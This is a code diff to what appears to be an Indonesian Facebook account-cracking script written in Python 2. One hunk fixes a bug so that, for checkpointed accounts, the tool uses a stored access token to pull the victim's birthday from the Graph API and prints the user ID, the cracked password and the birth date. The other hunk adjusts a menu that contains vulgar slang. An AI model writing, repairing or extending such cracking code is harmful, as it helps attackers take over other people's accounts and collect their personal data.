@@ -364,7 +364,7 @@ class ngentod:
             elif 'www.facebook.com' in response.json()['error_msg']:
                 try:
                     romz = open('token.txt').read()
-                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,pantek)).json()['birthday']
+                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
                     print '\r%s[CP] %s|%s|%s %s %s  ' % (K,user,pw,day,month,year)
@@ -645,9 +645,9 @@ def menu():
     #print ('[%s09%s] Info script'%(K,P));time.sleep(0.04)
     print ('╠══[%s0%s] Keluar (Ahh Ngecrot) '%(M,P))
     print ('%s║%s'%(P,P))
-    unik = raw_input('%s╚══[•] Menu : %s'%(P,K))
+    unik = raw_input('%s╠═[•] Menu : %s'%(P,K));time.sleep(0.04)
     if unik == '':
-        print("%s╚══[•] Isi yang benar kentod ] "%(M));jeda(2);menu()
+        print("%s╚═[•] Isi yang benar kentod ] "%(M));jeda(2);menu()
     elif unik in['1','01']:
         publik(romz)
     elif unik in['2','02']:
